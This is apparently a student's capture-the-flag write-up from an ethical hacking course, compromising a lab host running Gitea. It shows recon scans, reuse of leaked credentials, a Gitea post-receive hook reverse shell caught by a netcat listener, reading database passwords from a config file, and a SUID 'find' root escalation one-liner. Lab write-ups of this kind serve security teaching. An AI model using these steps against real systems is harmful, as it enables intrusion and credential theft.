# arwen

# recon

## nslookup
```
└─$ nslookup arwen.shire.org 10.0.5.22
Server:         10.0.5.22
Address:        10.0.5.22#53

Name:   arwen.shire.org
Address: 10.0.5.27
```
## nmap
```
└─$ sudo nmap -sS -sV 10.0.5.27 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 10:28 EDT
Nmap scan report for 10.0.5.27
Host is up (0.012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
3000/tcp open  http    Golang net/http server

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.38 seconds
```
## dirb
```
└─$ dirb http://10.0.5.27             

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Apr 14 10:29:42 2026
URL_BASE: http://10.0.5.27/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.5.27/ ----
==> DIRECTORY: http://10.0.5.27/admin/                                                     
+ http://10.0.5.27/index.html (CODE:200|SIZE:10671)                                        
+ http://10.0.5.27/server-status (CODE:403|SIZE:274)                                       
                                                                                           
---- Entering directory: http://10.0.5.27/admin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Apr 14 10:29:45 2026
DOWNLOADED: 4612 - FOUND: 2
```
<img width="501" height="324" alt="image" src="https://github.com/user-attachments/assets/94d4b270-c51b-4728-982f-d568e66823f8" />

<img width="520" height="182" alt="image" src="https://github.com/user-attachments/assets/d19b6184-51c6-4cf0-8e0a-d5bd310f000d" />

found credentials
- user: arwen
- password: arwenpassword
- email: arwen@shire.org

these credentials do not work on ssh
```
└─$ ssh arwen@10.0.5.27
arwen@10.0.5.27's password: 
Permission denied, please try again.
```

these credentials can be used on the Gitea server on port 3000

<img width="1245" height="515" alt="image" src="https://github.com/user-attachments/assets/24c57f70-6587-4438-aeee-369cc50617e5" />

<img width="392" height="48" alt="image" src="https://github.com/user-attachments/assets/82cf5c9e-b325-4592-885e-9d5e6b992a15" />

gitea version 1.12.5

# exploitation

RCE exploit: https://www.exploit-db.com/exploits/49571
EBD-ID: 49571
Guide: https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/

creating new repo with a post-receive hook script that runs a reverse shell

<img width="886" height="453" alt="image" src="https://github.com/user-attachments/assets/c97f550d-a773-459f-bc33-2aec6d959709" />

on one tab, run a netcat listener.
```
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
└─$ nc -nlvp 4479               
listening on [any] 4479 ...
```

on the other tab, do a normal git push, this will trigger the post-receive script
```
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
└─$ git clone http://10.0.5.27:3000/arwen/nqaxsvw.git
Cloning into 'nqaxsvw'...
Username for 'http://10.0.5.27:3000': arwen
Password for 'http://arwen@10.0.5.27:3000': 
                                                                                                        
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
└─$ touch README.md           
                                                                                                        
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
└─$ git init                                         
Initialized empty Git repository in /home/champuser/ChamplainTechJournals/eth-hack-sec335/final/.git/
                                                                                                        
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
└─$ git add README.md 
                                                                                                        
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
└─$ git commit -m "initial commit"                   
[master (root-commit) ffd8817] initial commit
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 README.md
                                                                                                        
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
└─$ git remote add origin http://10.0.5.27:3000/arwen/nqaxsvw.git
                                                                                                        
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
└─$ git push -u origin master                                    
Username for 'http://10.0.5.27:3000': arwen
Password for 'http://arwen@10.0.5.27:3000': 
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 221 bytes | 221.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.0.5.27:3000/arwen/nqaxsvw.git
 * [new branch]      master -> master
branch 'master' set up to track 'origin/master'.
                                                                                                        
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
```

when the post-receive script runs, it will start a reverse shell that our listener will read
```
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
└─$ nc -nlvp 4479               
listening on [any] 4479 ...
connect to [10.0.17.26] from (UNKNOWN) [10.0.17.3] 41572
bash: cannot set terminal process group (1115): Inappropriate ioctl for device
bash: no job control in this shell
git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ 
```

we need to get access to arwen first, then to root
```
git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ find / -name "user-flag.txt"
<ies/arwen/nqaxsvw.git$ find / -name "user-flag.txt"
/home/arwen/user-flag.txt
git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ find / -name "root-flag.txt"
<ies/arwen/nqaxsvw.git$ find / -name "root-flag.txt"
/root/root-flag.txt
```



```
git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ mysql --version
mysql --version
mysql  Ver 8.0.30-0ubuntu0.22.04.1 for Linux on x86_64 ((Ubuntu))
```
all vulnerabilities seem to be DoS, which isn't very useful for gaining access

<img width="787" height="310" alt="image" src="https://github.com/user-attachments/assets/585f8d3e-f9b8-4791-9598-3da479d7b4dd" />


however, database credentials for gitea are stored in /etc/gitea/app.ini
```
[database]
DB_TYPE  = mysql
HOST     = 127.0.0.1:3306
NAME     = gitea
USER     = root
PASSWD   = SecurePassworD
SCHEMA   =
SSL_MODE = disable
CHARSET  = utf8
PATH     = /var/lib/gitea/data/gitea.db
```


git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ mysql -u root -pSecurePassworD


find / -user git | grep -v "^/var/lib/gitea" | grep -v "^/proc"  | grep -v "^/home/git"
```
git@arwen:~$ find / -user arwen | grep -v "^/proc" | grep -v "^/sys/fs/cgroup"
<rwen | grep -v "^/proc" | grep -v "^/sys/fs/cgroup"
...
/home/arwen
/home/arwen/.cache
/home/arwen/.cache/motd.legal-displayed
/home/arwen/.lesshst
/home/arwen/.bash_logout
/home/arwen/user-flag.txt
/home/arwen/.bashrc
/home/arwen/.mysql_history
/home/arwen/.profile
/tmp/passwd
/dev/pts/4


git@arwen:~$ ls /tmp/passwd -l
ls /tmp/passwd -l
-rw-r--r-- 1 arwen arwen 1912 Apr 14 15:57 /tmp/passwd

```

find files with SUID permissions
```
git@arwen:~$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/bin/find
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount3
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2717/usr/bin/chfn
/snap/core20/2717/usr/bin/chsh
/snap/core20/2717/usr/bin/gpasswd
/snap/core20/2717/usr/bin/mount
/snap/core20/2717/usr/bin/newgrp
/snap/core20/2717/usr/bin/passwd
/snap/core20/2717/usr/bin/su
/snap/core20/2717/usr/bin/sudo
/snap/core20/2717/usr/bin/umount
/snap/core20/2717/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2717/usr/lib/openssh/ssh-keysign
/snap/core20/2769/usr/bin/chfn
/snap/core20/2769/usr/bin/chsh
/snap/core20/2769/usr/bin/gpasswd
/snap/core20/2769/usr/bin/mount
/snap/core20/2769/usr/bin/newgrp
/snap/core20/2769/usr/bin/passwd
/snap/core20/2769/usr/bin/su
/snap/core20/2769/usr/bin/sudo
/snap/core20/2769/usr/bin/umount
/snap/core20/2769/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2769/usr/lib/openssh/ssh-keysign
git@arwen:~$ 
```

/usr/bin/find is unique in that it shouldnt have these permissions
```
git@arwen:~$ stat /usr/bin/find
stat /usr/bin/find
  File: /usr/bin/find
  Size: 282088          Blocks: 552        IO Block: 4096   regular file
Device: fd00h/64768d    Inode: 656020      Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2026-04-14 06:25:01.598992599 +0000
Modify: 2022-03-23 13:52:12.000000000 +0000
Change: 2022-08-17 11:07:45.501027033 +0000
 Birth: 2022-05-24 19:03:57.289351040 +0000

git@arwen:~$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
# cat /home/arwen/user-flag.txt
cat /home/arwen/user-flag.txt
"f699c7be-5c3d-413b-9c65-fb1a9790200f"
# cat /root/root-flag.txt
cat /root/root-flag.txt
"c21acd35-d741-4090-b2ca-341f70f2f471"
# 
```

